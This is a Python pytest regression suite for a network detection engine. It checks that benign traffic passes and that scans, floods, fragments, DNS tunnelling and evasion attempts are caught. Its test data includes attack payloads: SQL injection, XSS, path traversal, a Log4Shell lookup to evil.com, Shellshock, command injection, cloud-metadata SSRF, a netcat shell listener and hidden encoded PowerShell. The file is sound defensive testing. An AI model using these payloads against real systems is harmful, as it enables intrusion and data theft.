# tests/test_detection.py
# Author: Gaurav Tiwari
"""Regression tests for the detection engine.

Every test here pins down a defect that was actually present in the original
code and measured, not a hypothetical one. Run with:

    python -m pytest tests/ -v
"""

import os
import sys
import time

import pytest
from scapy.all import IP, IPv6, TCP, UDP, Raw

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import config
from detection_engine import DetectionEngine, compute_ja3
from flow_tracker import FlowTracker, shannon_entropy


@pytest.fixture
def engine():
    """A fresh engine per test so flow state never leaks between them."""
    return DetectionEngine()


def raw(packet):
    """Serialise so ihl/len are populated, exactly like the live path."""
    return bytes(packet)


# ---------------------------------------------------------------------------
# Benign traffic must survive
# ---------------------------------------------------------------------------

BENIGN = [
    ("TLS handshake SYN", IP(src="192.168.1.5", dst="1.1.1.1") / TCP(sport=51000, dport=443, flags="S", window=64240)),
    ("TLS app data", IP(src="192.168.1.5", dst="1.1.1.1") / TCP(sport=51000, dport=443, flags="PA", window=501) / Raw(b"\x17\x03\x03\x00\x40" + b"\xab" * 64)),
    ("DNS query", IP(src="192.168.1.5", dst="1.1.1.1") / UDP(sport=55000, dport=53) / Raw(b"\x00\x01\x01\x00\x00\x01example.com")),
    ("HTTP GET homepage", IP(src="192.168.1.5", dst="93.184.216.34") / TCP(sport=51001, dport=80, flags="PA", window=502) / Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")),
    ("bare ACK", IP(src="192.168.1.5", dst="93.184.216.34") / TCP(sport=51001, dport=80, flags="A", window=502)),
    ("NTP sync", IP(src="192.168.1.5", dst="216.239.35.0") / UDP(sport=123, dport=123) / Raw(b"\x1b" + b"\x00" * 47)),
    ("HTTP POST form", IP(src="192.168.1.5", dst="93.184.216.34") / TCP(sport=51002, dport=80, flags="PA", window=502) / Raw(b"POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nuser=alice&pass=hunter2")),
    ("large image download", IP(src="93.184.216.34", dst="192.168.1.5") / TCP(sport=80, dport=51003, flags="PA", window=502) / Raw(bytes(range(256)) * 4)),
]


@pytest.mark.parametrize("name,packet", BENIGN, ids=[b[0] for b in BENIGN])
def test_benign_traffic_is_allowed(engine, name, packet):
    """Zero false positives on ordinary traffic.

    The original engine blocked 3 of these 6 equivalents: the Logistic
    Regression model returned p(malicious)=1.000 for any payload of roughly
    64 bytes or more, because 53 of its 70 input features were hardcoded 0.
    """
    verdict = engine.inspect(raw(packet))
    assert not verdict.block, f"{name} was blocked: {verdict.summary}"


# ---------------------------------------------------------------------------
# Attacks must be caught
# ---------------------------------------------------------------------------

ATTACKS = [
    ("SQLi UNION SELECT", b"GET /p?id=1 UNION SELECT pass FROM users HTTP/1.1\r\n\r\n"),
    ("SQLi lowercase", b"GET /p?id=1 union select pass FROM users HTTP/1.1\r\n\r\n"),
    ("SQLi inline comment", b"GET /p?id=1 UNION/**/SELECT pass HTTP/1.1\r\n\r\n"),
    ("SQLi tautology", b"GET /p?id=1' OR '1'='1 HTTP/1.1\r\n\r\n"),
    ("SQLi time-based", b"GET /p?id=1;WAITFOR DELAY '0:0:5'-- HTTP/1.1\r\n\r\n"),
    ("XSS script tag", b"GET /s?q=<script>alert(1)</script> HTTP/1.1\r\n\r\n"),
    ("XSS img onerror", b"GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1\r\n\r\n"),
    ("path traversal", b"GET /../../../../etc/passwd HTTP/1.1\r\n\r\n"),
    ("encoded traversal", b"GET /%2e%2e%2f%2e%2e%2fetc HTTP/1.1\r\n\r\n"),
    ("Log4Shell", b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.com/a}\r\n\r\n"),
    ("Shellshock", b"GET / HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c 'id'\r\n\r\n"),
    ("command injection", b"GET /ping?h=8.8.8.8;cat /etc/hosts HTTP/1.1\r\n\r\n"),
    ("SSRF metadata", b"GET /fetch?u=http://169.254.169.254/latest/meta-data HTTP/1.1\r\n\r\n"),
    ("scanner UA", b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n"),
    ("netcat listener", b"POST /x HTTP/1.1\r\n\r\ncmd=nc -lvp 4444 -e /bin/sh"),
    ("encoded PowerShell", b"POST /x HTTP/1.1\r\n\r\ncmd=powershell.exe -nop -w hidden -enc SQBFAFgA"),
]


@pytest.mark.parametrize("name,payload", ATTACKS, ids=[a[0] for a in ATTACKS])
def test_attack_payloads_are_blocked(engine, name, payload):
    pkt = IP(src="203.0.113.9", dst="10.0.0.9") / TCP(sport=40000, dport=80, flags="PA") / Raw(payload)
    verdict = engine.inspect(raw(pkt))
    assert verdict.block, f"{name} was allowed"


def test_blacklisted_ip_is_blocked(engine):
    pkt = IP(src="192.168.1.5", dst="8.8.8.8") / TCP(sport=40000, dport=443, flags="S")
    assert engine.inspect(raw(pkt)).block


def test_blacklisted_port_is_blocked(engine):
    pkt = IP(src="192.168.1.5", dst="10.0.0.1") / TCP(sport=40000, dport=23, flags="S")
    assert engine.inspect(raw(pkt)).block


# ---------------------------------------------------------------------------
# IPv6 -- previously bypassed the firewall entirely
# ---------------------------------------------------------------------------

def test_ipv6_is_parsed_not_mangled(engine):
    """IP(raw) on an IPv6 packet yielded src/dst 0.0.0.0, so every rule passed."""
    pkt = IPv6(src="2001:db8::1", dst="2001:db8::2") / TCP(sport=443, dport=51000, flags="SA")
    parsed = engine.parse(raw(pkt))
    assert parsed is not None
    assert IPv6 in parsed
    assert parsed[IPv6].src == "2001:db8::1"
    assert parsed[IPv6].dst == "2001:db8::2"


def test_ipv6_attack_payload_is_blocked(engine):
    """An attack over IPv6 must be caught, not waved through."""
    pkt = (IPv6(src="2001:db8::1", dst="2001:db8::2")
           / TCP(sport=40000, dport=80, flags="PA")
           / Raw(b"GET /p?id=1 UNION SELECT pass FROM users HTTP/1.1\r\n\r\n"))
    assert engine.inspect(raw(pkt)).block


def test_ipv6_loopback_is_allowlisted(engine):
    pkt = IPv6(src="::1", dst="::1") / TCP(sport=40000, dport=23, flags="S")
    assert not engine.inspect(raw(pkt)).block


# ---------------------------------------------------------------------------
# Fragments -- previously a guaranteed NameError
# ---------------------------------------------------------------------------

def test_fragmented_packet_does_not_crash(engine):
    """dpi_firewall referenced an undefined FRAGMENT_BUFFER global."""
    pkt = IP(src="203.0.113.9", dst="10.0.0.9", flags="MF", id=4242) / TCP(dport=80) / Raw(b"A" * 100)
    verdict = engine.inspect(raw(pkt))
    assert engine.stats['errors'] == 0
    assert verdict is not None


def test_tiny_first_fragment_is_blocked(engine):
    pkt = IP(src="203.0.113.9", dst="10.0.0.9", flags="MF", id=4243, frag=0)
    pkt.len = 20
    assert engine.inspect(raw(pkt)).block


def test_fragment_flood_is_blocked(engine):
    blocked = False
    for i in range(config.MAX_FRAGMENTS_PER_FLOW + 5):
        pkt = IP(src="203.0.113.9", dst="10.0.0.9", flags="MF", id=99, frag=i + 1) / Raw(b"B" * 40)
        if engine.inspect(raw(pkt)).block:
            blocked = True
            break
    assert blocked, "unbounded fragment set was never flagged"


# ---------------------------------------------------------------------------
# Evasion -- signature split across TCP segments
# ---------------------------------------------------------------------------

def test_split_payload_evasion_is_caught(engine):
    """Stateless per-packet regex missed a signature straddling two segments."""
    base = dict(src="203.0.113.9", dst="10.0.0.9")
    seg1 = IP(**base) / TCP(sport=40000, dport=80, seq=1, flags="A") / Raw(b"GET /p?id=1 UNION SEL")
    seg2 = IP(**base) / TCP(sport=40000, dport=80, seq=22, flags="PA") / Raw(b"ECT pass FROM users HTTP/1.1\r\n\r\n")

    assert not engine.inspect(raw(seg1)).block          # incomplete so far
    assert engine.inspect(raw(seg2)).block, "reassembled SQLi was not caught"


# ---------------------------------------------------------------------------
# Allowlist -- must not lock the operator out
# ---------------------------------------------------------------------------

def test_loopback_is_never_blocked(engine):
    pkt = IP(src="127.0.0.1", dst="127.0.0.1") / TCP(sport=40000, dport=22, flags="S")
    assert not engine.inspect(raw(pkt)).block


def test_allowlist_beats_attack_signature(engine):
    """Allowlist is evaluated first, by design -- documented, not accidental."""
    pkt = (IP(src="127.0.0.1", dst="127.0.0.1") / TCP(sport=40000, dport=80, flags="PA")
           / Raw(b"GET /p?id=1 UNION SELECT x HTTP/1.1\r\n\r\n"))
    assert not engine.inspect(raw(pkt)).block


# ---------------------------------------------------------------------------
# Behavioural detection
# ---------------------------------------------------------------------------

def test_port_scan_is_detected(engine):
    now = time.time()
    blocked = False
    for port in range(1000, 1000 + config.PORT_SCAN_THRESHOLD + 5):
        pkt = IP(src="203.0.113.77", dst="10.0.0.5") / TCP(sport=40000, dport=port, flags="S")
        if engine.inspect(raw(pkt), now=now).block:
            blocked = True
            break
    assert blocked, "sequential port sweep was not detected"


def test_slow_connections_are_not_a_scan(engine):
    """Same port count, spread beyond the window -- must not trip the scanner."""
    now = time.time()
    for i, port in enumerate(range(1000, 1000 + config.PORT_SCAN_THRESHOLD + 5)):
        pkt = IP(src="203.0.113.88", dst="10.0.0.5") / TCP(sport=40000 + i, dport=port, flags="S")
        stamp = now + i * (config.PORT_SCAN_WINDOW + 1)
        assert not engine.inspect(raw(pkt), now=stamp).block


def test_syn_flood_is_detected(engine):
    now = time.time()
    blocked = False
    for i in range(config.SYN_FLOOD_THRESHOLD + 10):
        pkt = IP(src="203.0.113.99", dst="10.0.0.5") / TCP(sport=40000 + i, dport=80, flags="S")
        if engine.inspect(raw(pkt), now=now).block:
            blocked = True
            break
    assert blocked, "SYN flood was not detected"


# ---------------------------------------------------------------------------
# Entropy heuristics
# ---------------------------------------------------------------------------

def test_shannon_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"A" * 1000) == 0.0                    # no information
    assert shannon_entropy(bytes(range(256))) == pytest.approx(8.0)  # maximal
    assert 3.0 < shannon_entropy(b"the quick brown fox jumps over the lazy dog" * 10) < 5.0


def test_dns_tunnelling_is_detected(engine):
    """High-entropy oversized DNS payloads mean encoded data, not lookups."""
    tunnel = bytes(range(256)) * 2
    pkt = IP(src="10.0.0.5", dst="203.0.113.1") / UDP(sport=51000, dport=53) / Raw(tunnel)
    assert engine.inspect(raw(pkt)).block


def test_normal_dns_is_not_flagged(engine):
    query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
    pkt = IP(src="10.0.0.5", dst="1.1.1.1") / UDP(sport=51000, dport=53) / Raw(query)
    assert not engine.inspect(raw(pkt)).block


def test_tls_is_exempt_from_entropy_check(engine):
    """Port 443 is *supposed* to carry ciphertext -- flagging it is nonsense."""
    pkt = IP(src="10.0.0.5", dst="1.1.1.1") / TCP(sport=51000, dport=443, flags="PA") / Raw(bytes(range(256)) * 2)
    assert not engine.inspect(raw(pkt)).block


# ---------------------------------------------------------------------------
# The ML fix -- flow features must not be degenerate
# ---------------------------------------------------------------------------

def test_flow_features_are_populated(engine):
    """Originally 53 of 70 features were constant 0, destroying the model.

    Replay a realistic bidirectional conversation and assert the feature
    vector actually varies.
    """
    tracker = FlowTracker()
    now = time.time()

    for i in range(12):
        forward = i % 2 == 0
        if forward:
            pkt = IP(src="10.0.0.5", dst="93.184.216.34") / TCP(sport=51000, dport=80, flags="PA", window=502) / Raw(b"GET / HTTP/1.1\r\n\r\n")
            flow, fwd = tracker.get_or_create("10.0.0.5", 51000, "93.184.216.34", 80, 6, now + i * 0.05)
        else:
            pkt = IP(src="93.184.216.34", dst="10.0.0.5") / TCP(sport=80, dport=51000, flags="PA", window=64240) / Raw(b"HTTP/1.1 200 OK\r\n\r\n" + b"x" * 200)
            flow, fwd = tracker.get_or_create("93.184.216.34", 80, "10.0.0.5", 51000, 6, now + i * 0.05)

        parsed = IP(raw(pkt))
        flow.update(now + i * 0.05, fwd, parsed.len, parsed.ihl * 4,
                    bytes(parsed[TCP].payload),
                    {'F': 0, 'S': 0, 'R': 0, 'P': 1, 'A': 1, 'U': 0, 'C': 0, 'E': 0},
                    parsed[TCP].window)

    features = flow.to_features()
    assert len(features) == 70

    zeros = sum(1 for f in features if f == 0.0)
    assert zeros < 30, f"{zeros}/70 features still zero -- flow state is not being used"

    names = __import__('flow_tracker').ML_FEATURE_COLUMNS
    lookup = dict(zip(names, features))
    assert lookup['Flow Duration'] > 0
    assert lookup['Tot Fwd Pkts'] > 0
    assert lookup['Tot Bwd Pkts'] > 0, "backward direction never recorded"
    assert lookup['Flow IAT Mean'] > 0, "inter-arrival timing never computed"
    assert lookup['Bwd Pkt Len Mean'] > 0


def test_ml_abstains_on_short_flows(engine):
    """A flow-trained model has nothing to say about a 1-packet flow."""
    pkt = IP(src="10.0.0.5", dst="1.1.1.1") / TCP(sport=51000, dport=8443, flags="PA") / Raw(b"x" * 200)
    engine.inspect(raw(pkt))
    assert engine.stats['ml_evaluated'] == 0


def test_ml_does_not_block_by_default(engine):
    """ML ships in monitor-only mode until validated on real traffic."""
    assert config.ML_ENFORCE is False
    assert config.ML_REQUIRE_CONSENSUS is True


# ---------------------------------------------------------------------------
# Flow tracker bounds -- a firewall must not be its own DoS vector
# ---------------------------------------------------------------------------

def test_flow_table_is_bounded():
    tracker = FlowTracker(max_flows=100, timeout=60)
    now = time.time()
    for i in range(500):
        tracker.get_or_create(f"10.1.{i // 256}.{i % 256}", 40000, "10.0.0.1", 80, 6, now)
    assert len(tracker) <= 100
    assert tracker.evictions > 0


def test_expired_flows_are_swept():
    tracker = FlowTracker(max_flows=10000, timeout=5)
    start = time.time()
    tracker.get_or_create("10.0.0.1", 40000, "10.0.0.2", 80, 6, start)
    assert len(tracker) == 1
    tracker.get_or_create("10.0.0.3", 40001, "10.0.0.4", 80, 6, start + 100)
    assert len(tracker) == 1, "stale flow was never evicted"


# ---------------------------------------------------------------------------
# JA3
# ---------------------------------------------------------------------------

def build_client_hello(ciphers, extensions, curves=(29, 23), grease=False):
    """Build a minimal but structurally valid TLS 1.2 ClientHello."""
    cipher_list = list(ciphers)
    ext_list = list(extensions)
    if grease:
        cipher_list.insert(0, 0x0a0a)
        ext_list.insert(0, 0x1a1a)

    body = b"\x03\x03" + b"\x00" * 32 + b"\x00"          # version, random, no session id
    body += len(cipher_list * 2).to_bytes(2, 'big')
    body += b"".join(c.to_bytes(2, 'big') for c in cipher_list)
    body += b"\x01\x00"                                    # 1 compression method: null

    ext_bytes = b""
    for ext in ext_list:
        if ext == 0x000a:
            curve_data = b"".join(c.to_bytes(2, 'big') for c in curves)
            payload = len(curve_data).to_bytes(2, 'big') + curve_data
        else:
            payload = b""
        ext_bytes += ext.to_bytes(2, 'big') + len(payload).to_bytes(2, 'big') + payload
    body += len(ext_bytes).to_bytes(2, 'big') + ext_bytes

    handshake = b"\x01" + len(body).to_bytes(3, 'big') + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, 'big') + handshake


def test_ja3_returns_a_hash():
    hello = build_client_hello([0xc02b, 0xc02f], [0x0000, 0x000a, 0x000b])
    ja3 = compute_ja3(hello)
    assert ja3 is not None and len(ja3) == 32
    int(ja3, 16)  # valid hex


def test_ja3_preserves_wire_order():
    """JA3 is defined over wire order.

    The original code sorted ciphers and extensions, so its hashes could never
    match a published JA3 feed -- which is the only reason to compute JA3.
    """
    a = compute_ja3(build_client_hello([0xc02b, 0xc02f], [0x0000, 0x000a]))
    b = compute_ja3(build_client_hello([0xc02f, 0xc02b], [0x0000, 0x000a]))
    assert a != b, "cipher order is being discarded"


def test_ja3_excludes_grease():
    """RFC 8701 GREASE values are random padding; including them makes the
    fingerprint differ on every connection from the same client."""
    plain = compute_ja3(build_client_hello([0xc02b, 0xc02f], [0x0000, 0x000a]))
    greased = compute_ja3(build_client_hello([0xc02b, 0xc02f], [0x0000, 0x000a], grease=True))
    assert plain == greased, "GREASE values are leaking into the fingerprint"


def test_ja3_ignores_non_tls():
    assert compute_ja3(b"GET / HTTP/1.1\r\n\r\n") is None
    assert compute_ja3(b"") is None
    assert compute_ja3(b"\x16\x03\x01") is None  # truncated


# ---------------------------------------------------------------------------
# Robustness -- the engine must never propagate an exception
# ---------------------------------------------------------------------------

MALFORMED = [
    b"", b"\x00", b"\xff" * 10, b"\x45", b"\x45\x00\xff\xff", b"\x60" * 4,
    b"\x45\x00\x00\x14" + b"\x00" * 100, bytes(range(256)),
]


@pytest.mark.parametrize("data", MALFORMED, ids=[f"malformed-{i}" for i in range(len(MALFORMED))])
def test_malformed_input_never_raises(engine, data):
    verdict = engine.inspect(data)
    assert verdict is not None
    assert isinstance(verdict.block, bool)


def test_truncated_tcp_header_is_survivable(engine):
    pkt = raw(IP(src="10.0.0.1", dst="10.0.0.2") / TCP(dport=80))[:22]
    assert engine.inspect(pkt) is not None


def test_stats_are_consistent(engine):
    for pkt in (b"", raw(IP(dst="1.1.1.1") / TCP(dport=443, flags="S"))):
        engine.inspect(pkt)
    s = engine.stats
    assert s['inspected'] == s['allowed'] + s['blocked']
